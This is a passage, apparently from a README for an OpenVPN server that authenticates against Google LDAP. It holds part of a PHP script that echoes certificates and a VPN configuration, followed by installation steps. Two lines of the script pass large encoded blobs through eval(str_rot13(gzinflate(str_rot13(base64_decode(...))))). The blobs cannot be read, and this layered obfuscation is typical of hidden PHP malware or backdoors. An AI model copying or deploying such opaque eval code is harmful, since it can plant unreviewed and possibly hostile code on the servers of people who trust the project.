8eXsOkq9WiNVS0s1DOVxMGjyhf5vdaFXOSa40/UpmCngzJw96dGABGYjKQ8fVOV+TX27wHcDOt2zXQEtqEqdfILDWN3y3j78Rwua7h/D0p+hJplBVujbttvpJfWgsx8BGpZE+uvp/HDqIyFnYR8MtxtGFZvo32tG2zJ3zW+NB80B0xsJCmFL3/8Rboi5tG4d+FKdSZ6Sl8ceJ5bVe34gxJsKKDTYtNP5CSanmpCnDbY8knis+zJo56Xm0FzaYmL6+uuFfFlYkS4MhrZiT4VU4wQ+yg4uzLZmbgnxgAtXygTzVqYYV2i2NH3w0o0x6sFs7V86bnReCLLFlwazZA24rIir8prOh6agR6xjAw7N7hFmMx5AmxsH11+m96rQczyoCJvRezcyWF9XVh1LnT4dFN5DkAdnZHxcAqm3I+mFcQbOgUnqCyJGRA6CbFV+IZpwzAC4EZ4wl9oegNu18hsEEuG/QGQaaYwC8Hd33P2IEl58BIew//7X+/n3fwE=')))));
echo "
# -----BEGIN CERTIFICATE-----
# MIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/
# MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT
# DkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow
# SjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT
# GkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC
# AQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF
# q6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8
# SMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0
# Z8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA
# a6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj
# /PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T
# AQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG
# CCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv
# bTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k
# c3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw
# VAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC
# ARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz
# MDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu
# Y3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF
# AAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo
# uM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/
# wApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu
# X4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG
# PfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6
# KOqkqm57TH2H3eDJAkSnh6/DNFu0Qg==
# -----END CERTIFICATE-----";
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
//hardcoded setting start here
echo "
&lt;ca&gt;
-----BEGIN CERTIFICATE-----
##
##
-----END CERTIFICATE-----
&lt;/ca&gt;
&lt;cert&gt;
-----BEGIN CERTIFICATE-----
##
##
-----END CERTIFICATE-----
&lt;/cert&gt;
&lt;key&gt;
-----BEGIN PRIVATE KEY-----
##
##
-----END PRIVATE KEY-----
&lt;/key&gt;
key-direction 1
&lt;tls-crypt&gt;
#
# 2048 bit OpenVPN static key (Server Agent)
#
-----BEGIN OpenVPN Static key V1-----
##
##
-----END OpenVPN Static key V1-----
&lt;/tls-crypt&gt;";
//custom edidt end here

echo "
## -----BEGIN RSA SIGNATURE-----
## DIGEST:sha256
## YTdaoGgSdXRX6oQBIhfeKEmswr5FNB346b7C5iPk1bAeKS+1LE
## THLGiK6WIAzuga4u+FgEBsFOWC08hIeyMAFDrIgt3T9+9hak9C
## /UI9eWavhcTKRZO0/vcTOf9kDQ1n1X+A7a3R2IEOH0v7SYIYy6
## Cd3u4kHcMU+gGiWN7sWml1aOtFYt1tC2EDh0O0YnsEQ8O36oWA
## BON1em18lZCMlRYlnEBtioT7Z4iN3e5tS+DUCGU/a+Hi3x00CZ
## 6eADuk87AyTnKSea6I3ccsyDUF16kFDgaIXIgcGBw35tZygBOE
## 0K4BDSeXRuKv6c5HwUeC+uA3U/OqiAENRLdN7SJapg==
## -----END RSA SIGNATURE-----
## -----BEGIN CERTIFICATE-----
## MIIFXjCCBEagAwIBAgISA+B7ChtB4x/uIJDSdiy19Oo4MA0GCSqGSIb3DQEBCwUA
## MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD
## ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0yMDAyMDQxNjIzMDNaFw0y
## MDA1MDQxNjIzMDNaMB8xHTAbBgNVBAMTFHZwbi5hbGxoZWFydGNhcmUuY29tMIIB
## IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz0FXa1dCjUHt+XH1MNyGtNFG
## Q276CF7HSDSfbRmK8LNml7dwxljLsakk0DdneR2/pWWywCgXxzhzVwgqUBDSZc5A
## trm4/IWFxygIuamPPxEixgPe/cQKws5iz+a5uO+rBazNMaeYU8ZIZMBcUdZqWBiC
## 95aO72NREthZf3JscnuppBfouBe+U9rfHXN7Gr2xa9Rea0TBuqcd//is4jT5ZaRe
## o/O6ujU5H6Y8T4TWS/RMtDuI8NuomraGjbTwHY1Z9/9bri679pJKf+NUrKYlwub4
## 1Qa4M+Lq0DYmJmTO2qyMGwWE3qEhWm7d3+jKrpdoufzPc16UqDHda67AFQwOYQID
## AQABo4ICZzCCAmMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMB
## BggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQjRCN+vjPJpaHQCEMK
## Oww4rJV/ZTAfBgNVHSMEGDAWgBSoSmpjBH3duubRObemRWXv86jsoTBvBggrBgEF
## BQcBAQRjMGEwLgYIKwYBBQUHMAGGImh0dHA6Ly9vY3NwLmludC14My5sZXRzZW5j
## cnlwdC5vcmcwLwYIKwYBBQUHMAKGI2h0dHA6Ly9jZXJ0LmludC14My5sZXRzZW5j
## cnlwdC5vcmcvMB8GA1UdEQQYMBaCFHZwbi5hbGxoZWFydGNhcmUuY29tMEwGA1Ud
## IARFMEMwCAYGZ4EMAQIBMDcGCysGAQQBgt8TAQEBMCgwJgYIKwYBBQUHAgEWGmh0
## dHA6Ly9jcHMubGV0c2VuY3J5cHQub3JnMIIBAgYKKwYBBAHWeQIEAgSB8wSB8ADu
## AHQAXqdz+d9WwOe1Nkh90EngMnqRmgyEoRIShBh1loFxRVgAAAFwEToTtQAABAMA
## RTBDAiAM8duvyWN14uO9J/7Y7xMLxYRyxrNcWAH+MRc7Wrd3KwIfaSqD4SDsUEkB
## qtdIt0IqOzauqCnD7p1hz0+dCI4DPQB2ALIeBcyLos2KIE6HZvkruYolIGdr2vpw
## 57JJUy3vi5BeAAABcBE6E6MAAAQDAEcwRQIgMDQ9pUhTfQyRJTmo4ShANR7G9qik
## J5S2lxfwqWaZoX0CIQC5qfs1hq4GUX/79I+aonie9TKMR7D/QaZp0pR6uH2dGzAN
## BgkqhkiG9w0BAQsFAAOCAQEAUnmjabgBVVmiYMIfmn60a4z/fssYt+7PvPbv/VGw
## y6kBVhJo8s9J/dpaOIsx63ypQKQXvIUeZyy9md+Gf8wOC2dh0o0hmCfF+cgUPRQb
## xLJyPXSPEngHN+8SEQiq0TfhW1Ep/VTgkS+mgHDiZkzSKMrJrztJiA5bXbU9d+Ba
## 956Zl3U1/iJv7hpPjP8sFkTfJu+3HoK0l1AqxT/eKzZgfvEBMyabjOneT149m7sY
## mmuQkDgjpdnBWT8xRnodZfyWD7jRHYLSnHuuHT6r3nlGIPcWdOVupZ/IwNklJeao
## IZIfDQvlwYZSEiWeizt3SHSqXQXz7OBhPqzf3pQQ9S3Pyg==
## -----END CERTIFICATE-----
## -----BEGIN CERTIFICATE-----
## MIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/
## MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT
## DkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow
## SjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT
## GkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC
## AQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF
## q6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8
## SMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0
## Z8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA
## a6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj
## /PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T
## AQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG
## CCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv
## bTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k
## c3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw
## VAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC
## ARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz
## MDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu
## Y3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF
## AAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo
## uM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/
## wApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu
## X4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG
## PfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6
## KOqkqm57TH2H3eDJAkSnh6/DNFu0Qg==
## -----END CERTIFICATE-----
</string></value>
</param>
</params>
</methodResponse>";
    } else {
        echo "ERROR";
    }
}

```

# Setup
1. `sudo -s`
2. `git clone https://github.com/amakarem/openvpngldap`
3. `openvpn-install.sh`
4. `apt install openvpn-auth-ldap`
5. `mk dir /etc/openvpn/auth`
6. `cp ./config-sample/auth-ldap.conf /etc/openvpn/auth/auth-ldap.conf`
7. edit this file /etc/openvpn/auth/auth-ldap.conf with google cert and key file location after upload them to the server
`vi /etc/openvpn/auth/auth-ldap.conf`
8. edit the openvpn server.conf file located it `/etc/openvpn/server/server.conf` same as the sample
you can do this by run `cp ./config-sample/server.conf /etc/openvpn/server/server.conf`
9. download the client.ovpn file that is created from step number 3 to be same as the sample client file 
